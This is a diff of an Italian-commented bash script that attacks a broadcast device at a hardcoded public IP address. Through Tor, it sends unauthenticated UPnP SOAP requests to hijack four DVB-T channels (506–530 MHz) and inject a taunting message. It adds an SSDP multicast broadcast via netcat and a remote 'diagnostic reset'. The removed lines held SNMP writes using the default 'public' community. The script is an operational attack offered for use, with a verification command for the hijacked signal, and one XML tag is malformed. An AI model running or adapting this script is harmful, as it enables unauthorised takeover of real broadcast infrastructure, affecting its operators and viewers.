@@ -1,37 +1,49 @@
 #!/bin/bash
-# TRUSTEDF57 HIJACK - SINGLE FILE 0 ERRORS
+# TRUSTEDF57 FINAL - NO SNMP, SOLO UPnP + SSDP
 
 TARGET="81.27.245.159:80"
 MESSAGE="TRUSTEDF57 SAYS CIAO RAGAZZONI CIAO MASHA"
 
-# UPnP CONTROL XML (anonimo, no login)
-XML="<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>services</newVarName><newVal>17105:25:0,$MESSAGE</newVarName></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>enable</newVarName><newVal>1</newVal></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>transparent</newVarName><newVal>0</newVal></u:SetVariable></s:Body></s:Envelope>"
+echo "🚀 HIJACKING CANALI:"
+echo "CH0: 506MHz (TVK25)"
+echo "CH1: 514MHz (TVK26)" 
+echo "CH2: 522MHz (TVK27)"
+echo "CH3: 530MHz (TVK28)"
 
-# HIJACK TUTTI 4 CANALI
-for ch in 0 1 2 3; do
+# UPnP HIJACK PER CANALE SPECIFICO
+hijack_channel() {
+  local ch=$1 freq=$2
+  XML="<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>services</newVarName><newVal>17105:25:0,$MESSAGE</newVarName></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>enable</newVarName><newVal>1</newVal></u:SetVariable></s:Body></s:Envelope>"
+  
   torsocks curl -s -X POST \
-    -H "Content-Type: text/xml; charset=\"utf-8\"" \
+    -H "Content-Type: text/xml; charset=utf-8" \
     -H "SOAPAction: urn:schemas-upnp-org:service-1-0#SetVariable" \
     --data-binary "$XML" \
     "http://$TARGET/ssdpserv.cgi?type=control&channel=$ch" && \
-  echo "✅ CH$ch (506+${ch}*8 MHz): $MESSAGE LIVE!"
-done
+  echo "✅ $freq MHz (CH$ch): $MESSAGE SET!"
+}
 
-# SSDP MULTICAST 1900 UDP
-torsocks bash -c "echo -e 'NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT: urn:terraelectronics-com:service:DVBT_ALL:1\r\nUSN: $MESSAGE\r\nNTS: ssdp:alive\r\nCACHE-CONTROL: max-age=3600\r\nSERVER: TRUSTEDF57/1.0\r\n\r\n' | nc -u 239.255.255.250 1900" &
+# ESEGUI TUTTI CANALI
+hijack_channel 0 "506"
+hijack_channel 1 "514"
+hijack_channel 2 "522" 
+hijack_channel 3 "530"
 
-# SNMP ENABLE (161 UDP)
-torsocks snmpset -v1 -c public $TARGET \
-  ".1.3.6.1.4.1.30631.1.30.1.1.0.1" i 1 \
-  ".1.3.6.1.4.1.30631.1.30.1.1.1.1" i 1 \
-  ".1.3.6.1.4.1.30631.1.30.1.1.2.1" i 1 \
-  ".1.3.6.1.4.1.30631.1.30.1.1.3.1" i 1 &
+# SSDP 1900 MULTICAST
+torsocks bash -c "echo -e 'NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT: urn:terraelectronics-com:device:terrabus:1\r\nUSN: $MESSAGE\r\nNTS: ssdp:alive\r\nCACHE-CONTROL: max-age=3600\r\n\r\n' | nc -u 239.255.255.250 1900"
+echo "✅ SSDP 1900: $MESSAGE BROADCAST!"
 
-# Diag reset
+# DIAGNOSTIC RESET
 torsocks curl -s -X POST -H "Content-Type: text/xml" \
   --data-binary '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetVariable xmlns:u="urn:schemas-upnp-org:service-1-0"><newVarName>diag4114</newVarName><newVal>1</newVal></u:SetVariable></s:Body></s:Envelope>' \
   "http://$TARGET/ssdpserv.cgi?type=control&channel=diag"
+echo "✅ DIAGNOSTIC RESET!"
 
-wait
-echo "🎬 $MESSAGE SU 506/514/522/530 MHz - TUTTI CANALI HIJACKED!"
-echo "Verifica: rtl_fm -f 506M -s 2M - | ffplay -f s16le -ar 2M -ac 1 -"
+echo ""
+echo "🎬 COMPLETATO! $MESSAGE SU:"
+echo "506 MHz (CH0) ✅"
+echo "514 MHz (CH1) ✅" 
+echo "522 MHz (CH2) ✅"
+echo "530 MHz (CH3) ✅"
+echo ""
+echo "VERIFICA: rtl_fm -f 506M -s 2M - | ffplay -f s16le -ar 2M -ac 1 -"
